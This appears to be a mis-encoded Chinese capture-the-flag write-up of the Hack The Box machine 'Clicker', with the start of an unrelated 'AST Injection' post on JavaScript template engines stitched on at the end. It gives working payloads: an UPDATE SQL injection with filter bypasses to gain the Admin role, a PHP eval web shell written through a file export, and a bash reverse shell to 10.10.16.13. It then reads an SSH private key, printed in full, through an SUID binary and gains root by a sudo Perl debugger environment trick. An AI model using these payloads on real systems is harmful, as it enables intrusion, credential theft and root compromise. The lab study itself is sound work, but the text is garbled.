{ global $pdo; $params = [&quot;player&quot; =&gt; $player]; $stmt = $pdo-&gt;prepare(&quot;SELECT count(*) FROM players WHERE username = :player&quot;); $stmt-&gt;execute($params); $result = $stmt-&gt;fetchColumn(); if ($result &gt; 0) { return true; } return false;}function create_new_player($player, $password) { global $pdo; $params = [&quot;player&quot;=&gt;$player, &quot;password&quot;=&gt;hash(&quot;sha256&quot;, $password)]; $stmt = $pdo-&gt;prepare(&quot;INSERT INTO players(username, n, password, role, clicks, level) VALUES (:player,:player,:password,'User',0,0)&quot;); $stmt-&gt;execute($params);}function check_auth($player, $password) { global $pdo; $params = [&quot;player&quot; =&gt; $player]; $stmt = $pdo-&gt;prepare(&quot;SELECT password FROM players WHERE username = :player&quot;); $stmt-&gt;execute($params); if ($stmt-&gt;rowCount() &gt; 0) { $row = $stmt-&gt;fetch(PDO::FETCH_ASSOC); if(strcmp($row['password'], hash(&quot;=&quot;,$password)) == 0){ return true; } } return false;}function load_profile($player) { global $pdo; $params = [&quot;player&quot;=&gt;$player]; $stmt = $pdo-&gt;prepare(&quot;SELECT nickname, role, clicks, level FROM players WHERE username = :player&quot;); $stmt-&gt;execute($params); if ($stmt-&gt;rowCount() &gt; 0) { $row = $stmt-&gt;fetch(PDO::FETCH_ASSOC); return $row; } return array();}function save_profile($player, $args) { global $pdo; $params = [&quot;player&quot;=&gt;$player]; $setStr = &quot;&quot;; foreach ($args as $key =&gt; $value) { $setStr .= $key . &quot;=&quot; . $pdo-&gt;quote($value) . &quot;,&quot;; } $setStr = rtrim($setStr, &quot;,&quot;); $stmt = $pdo-&gt;prepare(&quot;UPDATE players SET $setStr WHERE username = :player&quot;); $stmt -&gt; execute($params);}// ONLY FOR THE ADMINfunction get_top_players($number) { global $pdo; $stmt = $pdo-&gt;query(&quot;SELECT nickname,clicks,level FROM players WHERE clicks &gt;= &quot; . $number); $result = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC); return $result;}function get_current_player($player) { global $pdo; $stmt = $pdo-&gt;prepare(&quot;SELECT nickname, clicks, level FROM players WHERE username = :player&quot;); $stmt-&gt;bindParam(':player', $player, PDO::PARAM_STR); $stmt-&gt;execute(); if ($stmt-&gt;rowCount() &gt; 0) { $result = $stmt-&gt;fetch(PDO::FETCH_ASSOC); return $result; } else { return null; }}?&gt; 1234567891011121314151617181920212223#save_game.php&lt;?phpsession_start();include_once(&quot;db_utils.php&quot;);if (isset($_SESSION['PLAYER']) &amp;&amp; $_SESSION['PLAYER'] != &quot;&quot;) { $args = []; foreach($_GET as $key=&gt;$value) { if (strtolower($key) === 'role') { // prevent malicious users to modify role header('Location: /index.php?err=Malicious activity detected!'); die; } $args[$key] = $value; } save_profile($_SESSION['PLAYER'], $_GET); // update session info $_SESSION['CLICKS'] = $_GET['clicks']; $_SESSION['LEVEL'] = $_GET['level']; header('Location: /index.php?msg=Game has been saved!'); }?&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#export.php&lt;?phpsession_start();include_once(&quot;db_utils.php&quot;);if ($_SESSION[&quot;ROLE&quot;] != &quot;Admin&quot;) { header('Location: /index.php'); die;}function random_string($length) { $key = ''; $keys = array_merge(range(0, 9), range('a', 'z')); for ($i = 0; $i &lt; $length; $i++) { $key .= $keys[array_rand($keys)]; } return $key;}$threshold = 1000000;if (isset($_POST[&quot;threshold&quot;]) &amp;&amp; is_numeric($_POST[&quot;threshold&quot;])) { $threshold = $_POST[&quot;threshold&quot;];}$data = get_top_players($threshold);$currentplayer = get_current_player($_SESSION[&quot;PLAYER&quot;]);$s = &quot;&quot;;if ($_POST[&quot;extension&quot;] == &quot;txt&quot;) { $s .= &quot;Nickname: &quot;. $currentplayer[&quot;nickname&quot;] . &quot; Clicks: &quot; . $currentplayer[&quot;clicks&quot;] . &quot; Level: &quot; . $currentplayer[&quot;level&quot;] . &quot;\\n&quot;; foreach ($data as $player) { $s .= &quot;Nickname: &quot;. $player[&quot;nickname&quot;] . &quot; Clicks: &quot; . $player[&quot;clicks&quot;] . &quot; Level: &quot; . $player[&quot;level&quot;] . &quot;\\n&quot;; }} elseif ($_POST[&quot;extension&quot;] == &quot;json&quot;) { $s .= json_encode($currentplayer); $s .= json_encode($data);} else { $s .= '&lt;table&gt;'; $s .= '&lt;thead&gt;'; $s .= ' &lt;tr&gt;'; $s .= ' &lt;th scope=&quot;col&quot;&gt;Nickname&lt;/th&gt;'; $s .= ' &lt;th scope=&quot;col&quot;&gt;Clicks&lt;/th&gt;'; $s .= ' &lt;th scope=&quot;col&quot;&gt;Level&lt;/th&gt;'; $s .= ' &lt;/tr&gt;'; $s .= '&lt;/thead&gt;'; $s .= '&lt;tbody&gt;'; $s .= ' &lt;tr&gt;'; $s .= ' &lt;th scope=&quot;row&quot;&gt;' . $currentplayer[&quot;nickname&quot;] . '&lt;/th&gt;'; $s .= ' &lt;td&gt;' . $currentplayer[&quot;clicks&quot;] . '&lt;/td&gt;'; $s .= ' &lt;td&gt;' . $currentplayer[&quot;level&quot;] . '&lt;/td&gt;'; $s .= ' &lt;/tr&gt;'; foreach ($data as $player) { $s .= ' &lt;tr&gt;'; $s .= ' &lt;th scope=&quot;row&quot;&gt;' . $player[&quot;nickname&quot;] . '&lt;/th&gt;'; $s .= ' &lt;td&gt;' . $player[&quot;clicks&quot;] . '&lt;/td&gt;'; $s .= ' &lt;td&gt;' . $player[&quot;level&quot;] . '&lt;/td&gt;'; $s .= ' &lt;/tr&gt;'; } $s .= '&lt;/tbody&gt;'; $s .= '&lt;/table&gt;';} $filename = &quot;exports/top_players_&quot; . random_string(8) . &quot;.&quot; . $_POST[&quot;extension&quot;];file_put_contents($filename, $s);header('Location: /admin.php?msg=Data has been saved in ' . $filename);?&gt; æ¼æ´åˆ©ç”¨(updateæ³¨å…¥)å‡çº§roledb_utils.phpæ–‡ä»¶ä¸­çš„save_profileå‡½æ•°å­˜åœ¨sqlæ³¨å…¥ï¼šupdate; åˆ©ç”¨é“¾ï¼šplay.php ==&gt; save_game.php ==&gt; db_utils.php ==&gt;save_profile 1234567891011function save_profile($player, $args) { global $pdo; $params = [&quot;player&quot;=&gt;$player]; $setStr = &quot;&quot;; foreach ($args as $key =&gt; $value) { $setStr .= $key . &quot;=&quot; . $pdo-&gt;quote($value) . &quot;,&quot;; } $setStr = rtrim($setStr, &quot;,&quot;); $stmt = $pdo-&gt;prepare(&quot;UPDATE players SET $setStr WHERE username = :player&quot;); $stmt -&gt; execute($params);} :player å ä½ç¬¦è¡¨ç¤ºä¸€ä¸ªç©å®¶çš„ç”¨æˆ·åï¼Œå®ƒå°†åœ¨æ‰§è¡ŒæŸ¥è¯¢æ—¶è¢« $params æ•°ç»„ä¸­å¯¹åº”çš„å€¼æ‰€æ›¿æ¢ã€‚è¿™ç§åšæ³•å¯ä»¥ç¡®ä¿ SQL æŸ¥è¯¢çš„å®‰å…¨æ€§;ä½†æ˜¯$setStræ²¡æœ‰ä½¿ç”¨å ç”¨ç¬¦å·ï¼›å­˜åœ¨æ³¨å…¥ç‚¹; å¹¶ä¸”$argså˜é‡æ˜¯é€šè¿‡save_game.phpæ–‡ä»¶çš„foreach($_GET as $key=&gt;$value)å‡½æ•°ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥æ§åˆ¶ï¼›å³ä½¿åœ¨save_game.phpæ–‡ä»¶å¯¹ä¸Šä¼ çš„GETå‚æ•°çš„é”®å€¼ä¸èƒ½ä¸ºroleåšäº†é™åˆ¶ï¼Œä¹Ÿå¯ä»¥è½»æ¾ç»•è¿‡ï¼› 1234if (strtolower($key) === 'role') { header('Location: /index.php?err=Malicious activity detected!'); die; } æ–¹æ³•ä¸€å°†role%3d&quot;Admin&quot;%23å½“ä½œé”®å€¼ç»•è¿‡æ£€æŸ¥ï¼Œå†ç”¨#æ³¨é‡Šåé¢çš„å†…å®¹ 1UPDATE players SET role=&quot;Admin&quot;# WHERE username = :player 1GET /save_game.php?clicks=0&amp;level=0&amp;role%3d&quot;Admin&quot;%23 æ–¹æ³•äºŒåˆ©ç”¨/**/ç»•è¿‡strtolower($key) === 'role' 1UPDATE players SET role/**/=&quot;Admin&quot; WHERE username = :player 1GET /save_game.php?clicks=0&amp;level=0&amp;role%2f%2a%2a%2f=Admin ğŸ‘†ğŸexport.phpä¸­å­˜åœ¨å±é™©å‡½æ•°file_put_contents($filename, $s);,å…ˆæ¥çœ‹çœ‹$filenameæ˜¯æ€ä¹ˆæ¥çš„ï¼Œå¦‚ä¸‹ï¼š â€œexports/top_players_â€åŠ ä¸Š8ä¸ªéšæœºå­—ç¬¦ï¼Œå˜é‡åä¸ºextensionçš„postä¼ å‚(è¿™é‡Œæ²¡æœ‰å¯¹åç¼€åšæ£€æŸ¥ï¼Œå¯ä»¥ä¿®æ”¹åç¼€ä¸ºphpç­‰)ï¼›æ‰€ä»¥æ–‡ä»¶åç¼€æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„; 1$filename = &quot;exports/top_players_&quot; . random_string(8) . &quot;.&quot; . $_POST[&quot;extension&quot;]; å†æ¥çœ‹çœ‹$så˜é‡æ˜¯æ€ä¹ˆæ¥çš„ï¼›å½“åç¼€ä¸æ˜¯txt,jsonæ—¶ å…¶ä¸­$currentplayer[&quot;nickname&quot;],$currentplayer[&quot;clicks&quot;] ,$currentplayer[&quot;level&quot;];ä¸‰ä¸ªå˜é‡æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼› è€Œ$currentplayer[&quot;clicks&quot;] ,$currentplayer[&quot;level&quot;]çš„æ•°æ®ç±»å‹æ˜¯æ•°å­—ï¼Œæ‰€ä»¥åªèƒ½åœ¨nicknameåŠ¨æ‰‹ï¼› &quot;nickname&quot;çš„å€¼ä¹Ÿå¯ä»¥é€šè¿‡updateæ³¨å…¥æ¥æ”¹å˜ï¼› 1GET /save_game.php?clicks=1000001&amp;level=0&amp;nickname=%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%73%68%65%6c%6c%27%5d%29%3b%3f%3e åœ¨æŠ“åŒ…å°†åç¼€æ”¹ä¸ºphp;extension=php åå¼¹shell 1POST:shell=system('%2Fbin%2Fbash%20-c%20%22%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.13%2F5555%200%3E%261%22'); user_www-dataæ€è·¯åº”è¯¥å…ˆå»æ•°æ®åº“é‡Œæ‰¾æ•æ„Ÿä¿¡æ¯ï¼Œæ‰¾ä¸åˆ°å†æœé›†åˆ«çš„æ•æ„Ÿä¿¡æ¯ï¼› 12bash-5.1$ find / -perm -4000 2&gt;/dev/null/opt/manage/execute_query å°†jackç”¨æˆ·çš„suidæ–‡ä»¶ï¼š/opt/manage/execute_queryä¸‹è½½åˆ°æœ¬åœ°æŸ¥çœ‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657main(){if ( argc &gt; 1 ) { v8 = atoi(argv[1]); dest = (char *)calloc(0x14uLL, 1uLL); switch ( v8 ) { case 0: puts(&quot;ERROR: Invalid arguments&quot;); return 2; case 1: strncpy(dest, &quot;create.sql&quot;, 0x14uLL); goto LABEL_10; case 2: strncpy(dest, &quot;populate.sql&quot;, 0x14uLL); goto LABEL_10; case 3: strncpy(dest, &quot;reset_password.sql&quot;, 0x14uLL); goto LABEL_10; case 4: strncpy(dest, &quot;clean.sql&quot;, 0x14uLL); goto LABEL_10; default: strncpy(dest, argv[2], 0x14uLL);LABEL_10: strcpy(s, &quot;/home/jack/queries/&quot;); v4 = strlen(s); v5 = strlen(dest); name = (char *)calloc(v4 + v5 + 1, 1uLL); strcat(name, s); strcat(name, dest); setreuid(0x3E8u, 0x3E8u); if ( access(name, 4) ) { puts(&quot;File not readable or not found&quot;); } else { strcpy(src, &quot;/usr/bin/mysql -u clicker_db_user --password='clicker_db_password' clicker -v &lt; &quot;); v6 = strlen(src); v7 = strlen(dest); command = (char *)calloc(v6 + v7 + 1, 1uLL); strcat(command, src); strcat(command, name); system(command); } result = 0; break; } } else { puts(&quot;ERROR: not enough arguments&quot;); return 1; } return result;} 12/usr/bin/mysql -u clicker_db_user --password='clicker_db_password' clicker -v &lt; clean.sql#&lt; clean.sql è¡¨ç¤ºä»åä¸º clean.sql çš„æ–‡ä»¶ä¸­è¯»å– SQL å‘½ä»¤ï¼Œå¹¶å°†å…¶å‘é€åˆ° MySQL æœåŠ¡å™¨ä»¥æ‰§è¡Œ è¿™é‡Œæœ‰æ„æ€çš„æ˜¯å³ä½¿ä¸æ˜¯sqlæ–‡ä»¶ä¹Ÿå¯ä»¥è¯»å–ï¼› 123456789101112131415161718192021222324252627282930313233343536373839404142bash-5.1$ /opt/manage/execute_query 5 ../.ssh/id_rsamysql: [Warning] Using a password on the command line interface can be insecure.-------------------BEGIN OPENSSH PRIVATE KEY---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-----END OPENSSH PRIVATE KEY----------------- id_rsa æ˜¯ SSH å¯†é’¥æ–‡ä»¶çš„é»˜è®¤åç§°ä¹‹ä¸€ã€‚åœ¨ SSH å¯†é’¥è®¤è¯ä¸­ï¼Œid_rsa æ˜¯ç§é’¥æ–‡ä»¶çš„é»˜è®¤åç§°ï¼Œè€Œ id_rsa.pub æ˜¯ç›¸åº”çš„å…¬é’¥æ–‡ä»¶çš„é»˜è®¤åç§°ã€‚è¿™äº›æ–‡ä»¶é€šå¸¸ç”¨äº SSH å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨è¿›è¡Œå®‰å…¨è¿æ¥å’Œèº«ä»½éªŒè¯ã€‚ç§é’¥æ–‡ä»¶ï¼ˆid_rsaï¼‰åº”è¯¥è¢«å¦¥å–„ä¿ç®¡ï¼Œè€Œå…¬é’¥æ–‡ä»¶ï¼ˆid_rsa.pubï¼‰é€šå¸¸è¢«æ”¾ç½®åœ¨éœ€è¦è¿›è¡Œèº«ä»½éªŒè¯çš„æœåŠ¡å™¨ä¸Šçš„ .ssh/authorized_keys æ–‡ä»¶ä¸­ã€‚ SSH å¯†é’¥å¯¹é€šå¸¸ç”¨äºæ›¿ä»£ä¼ ç»Ÿçš„åŸºäºå¯†ç çš„èº«ä»½éªŒè¯ï¼Œæä¾›äº†æ›´é«˜çš„å®‰å…¨æ€§ã€‚ è¿™é‡Œè¯»å–çš„æ–‡ä»¶æ ¼å¼æœ‰ç‚¹é—®é¢˜ç¬¬ä¸€è¡Œå’Œæœ€åä¸€è¡Œå°‘äº†ä¸¤ä¸ª-ç¬¦å·ï¼ŒåŠ ä¸Šå»ï¼Œè¿˜éœ€è¦å°†æƒé™æ”¹æˆåªè¯»ï¼Œå¦åˆ™ä¸è®©è¿æ¥ï¼š 12345678910â”Œâ”€â”€(kaliã‰¿kali)-[~]â””â”€$ ssh -i id_rsa -l jack 10.10.11.232@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ WARNING: UNPROTECTED PRIVATE KEY FILE! @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Permissions 0644 for 'id_rsa' are too open.It is required that your private key files are NOT accessible by others.This private key will be ignored.Load key &quot;id_rsa&quot;: bad permissionsjack@10.10.11.232's password: æ”¹æˆåªè¯»å°±å¥½äº†ï¼Œå†ç”¨sshè¿æ¥å³å¯ï¼› 1chmod 400 id_rsa user_jackææƒ12345678-bash-5.1$ sudo -lMatching Defaults entries for jack on clicker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser jack may run the following commands on clicker: (ALL : ALL) ALL (root) SETENV: NOPASSWD: /opt/monitor.sh 12345678910111213141516171819-bash-5.1$ cat /opt/monitor.sh#!/bin/bashif [ &quot;$EUID&quot; -ne 0 ]#idä¸ä¸º0 then echo &quot;Error, please run as root&quot; exitfiset PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/binunset PERL5LIB;unset PERLLIB;data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);/usr/bin/xml_pp &lt;&lt;&lt; $data;if [[ $NOSAVE == &quot;true&quot; ]]; then exit;else timestamp=$(/usr/bin/date +%s) /usr/bin/echo $data &gt; /root/diagnostic_files/diagnostic_${timestamp}.xmlfi å…¶ä¸­ï¼› 12345678910unset PERL5LIB;unset PERLLIB;è¿™ä¸¤è¡Œå‘½ä»¤æ˜¯ç”¨äºåœ¨Unix/Linuxæ“ä½œç³»ç»Ÿä¸‹å–æ¶ˆè®¾ç½®ç¯å¢ƒå˜é‡çš„å‘½ä»¤ã€‚è®©æˆ‘ä¸ºæ‚¨è§£é‡Šæ¯ä¸ªå‘½ä»¤çš„å«ä¹‰ï¼šunset PERL5LIB;ï¼šè¿™ä¸ªå‘½ä»¤ç”¨äºå–æ¶ˆè®¾ç½®åä¸ºPERL5LIBçš„ç¯å¢ƒå˜é‡ã€‚PERL5LIBæ˜¯ä¸€ä¸ªç”¨äºæŒ‡å®šPerlç¼–ç¨‹è¯­è¨€åº“è·¯å¾„çš„ç¯å¢ƒå˜é‡ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œå®ƒç”¨äºå‘Šè¯‰Perlè§£é‡Šå™¨åœ¨å“ªé‡ŒæŸ¥æ‰¾Perlæ¨¡å—å’Œåº“æ–‡ä»¶ã€‚é€šè¿‡è¿è¡Œè¿™ä¸ªå‘½ä»¤ï¼Œæ‚¨å°†ä»ç¯å¢ƒä¸­ç§»é™¤PERL5LIBå˜é‡çš„å®šä¹‰ï¼Œä½¿å¾—Perlä¸å†ä½¿ç”¨è¯¥å˜é‡æ¥å®šä½æ¨¡å—å’Œåº“æ–‡ä»¶ã€‚unset PERLLIB;ï¼šè¿™ä¸ªå‘½ä»¤ç”¨äºå–æ¶ˆè®¾ç½®åä¸ºPERLLIBçš„ç¯å¢ƒå˜é‡ã€‚ç±»ä¼¼äºPERL5LIBï¼ŒPERLLIBä¹Ÿæ˜¯ç”¨äºæŒ‡å®šPerlåº“è·¯å¾„çš„ç¯å¢ƒå˜é‡ã€‚è¿è¡Œè¿™ä¸ªå‘½ä»¤å°†ä»ç¯å¢ƒä¸­ç§»é™¤PERLLIBå˜é‡çš„å®šä¹‰ï¼Œåœæ­¢ä½¿ç”¨å®ƒæ¥å®šä½Perlæ¨¡å—å’Œåº“æ–‡ä»¶ã€‚å–æ¶ˆè®¾ç½®è¿™äº›ç¯å¢ƒå˜é‡é€šå¸¸æ˜¯åœ¨éœ€è¦æ¢å¤åˆ°é»˜è®¤Perlåº“è·¯å¾„æˆ–åœ¨ç‰¹å®šæƒ…å†µä¸‹ä¸å¸Œæœ›ä½¿ç”¨è¿™äº›è‡ªå®šä¹‰è·¯å¾„æ—¶ä½¿ç”¨çš„ã€‚å®ƒä»¬åœ¨ç¡®ä¿Perlåœ¨ç‰¹å®šä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨é»˜è®¤è®¾ç½®æ—¶éå¸¸æœ‰ç”¨ã€‚ åº”è¯¥æ—¶ä¸ºäº†é¢„é˜²é€šè¿‡æ›´æ”¹è¿™ä¸¤ä¸ªç¯å¢ƒå˜é‡æ¥è¿›è¡Œæ”»å‡»ï¼Œè¿™è¯´æ˜äº†é‡Œé¢æœ‰perlå†™çš„ç¨‹åºã€‚åº”è¯¥æ˜¯/usr/bin/xml_ppï¼Œä½†æ˜¯é™¤äº†ä¸¤ä¸ªç¯å¢ƒå˜é‡æ˜¯å±é™©çš„ï¼Œè¿˜æœ‰ä¸¤ä¸ªã€‚ **PERL5OPT=-d**ï¼šè¿™éƒ¨åˆ†å°† PERL5OPT ç¯å¢ƒå˜é‡è®¾ç½®ä¸º dã€‚åœ¨Perlä¸­ï¼Œd é€‰é¡¹ç”¨äºå¯åŠ¨è°ƒè¯•å™¨ï¼Œå®ƒå…è®¸æ‚¨åœ¨ä»£ç æ‰§è¡Œè¿‡ç¨‹ä¸­è¿›è¡Œè°ƒè¯•ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œè¿™æ˜¯ä¸€ä¸ªåˆæ³•çš„ç”¨æ³•ï¼Œç”¨äºåœ¨å¼€å‘å’Œè°ƒè¯•Perlè„šæœ¬æ—¶å¯ç”¨è°ƒè¯•åŠŸèƒ½ã€‚ **PERL5DB='system(&quot;chmod u+s /bin/bash&quot;);'**ï¼šè¿™éƒ¨åˆ†å°† PERL5DB ç¯å¢ƒå˜é‡è®¾ç½®ä¸ºä¸€ä¸ªPerlè¡¨è¾¾å¼ã€‚è¿™ä¸ªPerlè¡¨è¾¾å¼çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªæ¶æ„çš„å‘½ä»¤ï¼Œå®ƒè¯•å›¾åœ¨Perlè°ƒè¯•å™¨ç¯å¢ƒä¸­è¿è¡Œ **system(&quot;chmod u+s /bin/bash&quot;);**ã€‚è¿™ä¸ªå‘½ä»¤çš„ç›®çš„æ˜¯åœ¨ç³»ç»Ÿä¸­ä¸º /bin/bash è¿™ä¸ªShellç¨‹åºè®¾ç½®äº†ç”¨æˆ·å¯æ‰§è¡Œçš„SUIDï¼ˆSet User IDï¼‰æƒé™ï¼Œè¿™å°†ä½¿å¾—ä»»ä½•ç”¨æˆ·éƒ½èƒ½ä»¥è¶…çº§ç”¨æˆ·çš„æƒé™è¿è¡Œ **/bin/bash**ï¼Œè¿™æ˜¯éå¸¸å±é™©å’Œä¸å®‰å…¨çš„æ“ä½œã€‚ å¤§æ¦‚æ„æ€æ˜¯åœ¨æ‰§è¡Œperlç¨‹åºæ—¶å¼€å¯è°ƒè¯•ï¼Œç„¶åå†è°ƒè¯•æ—¶è¿è¡Œ**system(&quot;chmod u+s /bin/bash&quot;);** æ‰§è¡Œ 1sudo PERL5OPT=-d PERL5DB='system(&quot;chmod u+s /bin/bash&quot;);' /opt/monitor.sh 12345678-bash-5.1$ sudo PERL5OPT=-d PERL5DB='system(&quot;chmod u+s /bin/bash&quot;);' /opt/monitor.shNo DB::DB routine defined at /usr/bin/xml_pp line 9.No DB::DB routine defined at /usr/lib/x86_64-linux-gnu/perl-base/File/Temp.pm line 870.END failed--call queue aborted.-bash-5.1$ bash -pbash-5.1# iduid=1000(jack) gid=1000(jack) euid=0(root) groups=1000(jack),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)bash-5.1# è¡¥å……å‡çº§shellå‘½ä»¤ 1script /dev/null -c++","link":"/2023/12/14/Clicker(HTB)/"},{"title":"AST Injection","text":"æ¨¡ç‰ˆå¼•æ“æ˜¯ä»€ä¹ˆJS webå¼€å‘ä¸­å¸¸ç”¨çš„æ¨¡ç‰ˆå¼•æ“å¦‚ ejsã€pugã€handlebars åŠŸèƒ½ï¼šåŠ¨æ€æ¸²æŸ“HTMLä»£ç ï¼Œåˆ›å»ºå¯é‡å¤ä½¿ç”¨çš„é¡µé¢ç»“æ„ ejs æ¨¡ç‰ˆä½¿ç”¨123456789101112131415// å®‰è£…EJSæ¨¡å—ï¼šnpm install ejs// å¼•å…¥EJSæ¨¡å—const ejs = require('ejs');// å®šä¹‰æ¨¡æ¿const template = ` &lt;h1&gt;Hello, &lt;%= name %&gt;!&lt;/h1&gt;`;// æ¸²æŸ“æ¨¡æ¿const data = { name: 'John' };const html = ejs.render(template, data);console.log(html); handlebars æ¨¡ç‰ˆä½¿ç”¨123456789101112131415161718// å®‰è£…Handlebarsæ¨¡å—ï¼šnpm install handlebars// å¼•å…¥Handlebarsæ¨¡å—const handlebars = require('handlebars');// å®šä¹‰æ¨¡æ¿const template = ` &lt;h1&gt;Hello, {{name}}!&lt;/h1&gt;`;// ç¼–è¯‘æ¨¡æ¿const compiledTemplate = handlebars.compile(template);// æ¸²æŸ“æ¨¡æ¿const data = { name: 'John' };const html = compiledTemplate(data);console.log(html); pug æ¨¡ç‰ˆä½¿ç”¨123456789101112131415161718// å®‰è£…Pugæ¨¡å—ï¼šnpm install pug// å¼•å…¥Pugæ¨¡å—const pug = require('pug');// å®šä¹‰æ¨¡æ¿const template = ` h1 Hello, #{name}!`;// ç¼–è¯‘æ¨¡æ¿const compiledTemplate = pug.compile(template);// æ¸²æŸ“æ¨¡æ¿const data = { name: 'John' };const html = compiledTemplate(data);console.log(html); æ€»ç»“ï¼šå¯ä»¥çœ‹åˆ°æ¨¡ç‰ˆå¼•æ“å…¶å®éƒ½æœ‰å„è‡ªçš„ä¸€äº›ç‰¹å®šè¯­æ³•è§„åˆ™ï¼Œæ¯”å¦‚ pug ä¸­å¯ä»¥é€šè¿‡ #{name} æ¥å¼•ç”¨å¤–éƒ¨ç¯å¢ƒçš„å˜é‡ï¼Œ ejs åˆ™æ˜¯ \\&lt;%= name %&gt;ã€‚é€šè¿‡è¿™ç§æ–¹å¼ç®€åŒ–htmlä»£ç çš„ç¼–å†™ï¼ŒåŒæ—¶å®ç°æ¨¡ç‰ˆé‡ç”¨ 